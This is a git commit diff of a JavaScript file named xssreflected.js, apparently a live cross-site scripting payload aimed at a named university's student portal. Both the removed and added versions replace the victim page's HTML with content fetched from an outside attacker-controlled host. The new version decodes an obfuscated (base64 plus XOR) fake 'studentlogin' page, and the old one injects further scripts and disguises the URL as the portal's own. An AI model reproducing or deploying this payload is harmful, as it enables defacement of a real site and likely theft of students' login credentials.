76bec72b5efbbf4560f6f2509e9223aab51804c9
CyberCutie0 <jaytechph0@gmail.com>
2025-01-20 22:32:55 +0800

    Update xssreflected.js

--- xssreflected.js
+++ xssreflected.js
@@ -1,41 +1,22 @@
-function changeURL(newUrl, title = '') {
-    // Replace the current URL and history entry without adding a value
-    history.replaceState(null, title, newUrl);
-
-    // Optionally update the page title
-    if (title) {
-        document.title = title;
+function xorEncryptDecrypt(decodedhtml, key) {
+    let result = '';
+    for (let i = 0; i < decodedhtml.length; i++) {
+        result += String.fromCharCode(decodedhtml.charCodeAt(i) ^ key.charCodeAt(i % key.length));
     }
-
-    console.log(`URL replaced with: ${newUrl}`);
+    return result;
 }
 
-function deface(url, title = '') {
-    const corsProxyUrl = 'https://corsproxy.io/?url=';
-    // Extract the part after the domain
-    const path = url.replace("https://aims.ucc-caloocan.edu.ph", "");
-    changeURL(path, title);
-
-
-    fetch(corsProxyUrl + url)
-      .then(response => response.text()) // Get the response as text (HTML content)
-      .then(data => {
-        // Replace the entire HTML of the current document
-        document.documentElement.innerHTML = data;
-
-        // Re-attach the JavaScript
-        const script = document.createElement("script");
-        script.src = "https://cybercutie0.github.io/-/defacer.js";
-        document.head.appendChild(script);
-
-        const script2 = document.createElement("script");
-        script2.src = "https://cybercutie0.github.io/-/xssreflected2.js";
-        document.head.appendChild(script2);
-      })
-      .catch(error => console.error('Error:', error));
+function deface() {
+    fetch('https://cybercutie0.github.io/-/studentlogin.txt')
+        .then(response => response.text()) // Get the response as text (HTML content)
+        .then(data => {
+            let decodedhtml = atob(data);
+            let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
+            // Replace the entire HTML of the current document
+            document.documentElement.innerHTML = decryptedHTML;
+        })
+        .catch(error => console.error('Error:', error));
 }
 
-console.log("IMPORTING SUCCESS");
-deface('https://aims.ucc-caloocan.edu.ph/ucc/students/', 'Student Access Module');
-console.clear();
-
+console.log("DEFACER SUCCESS");
+deface();
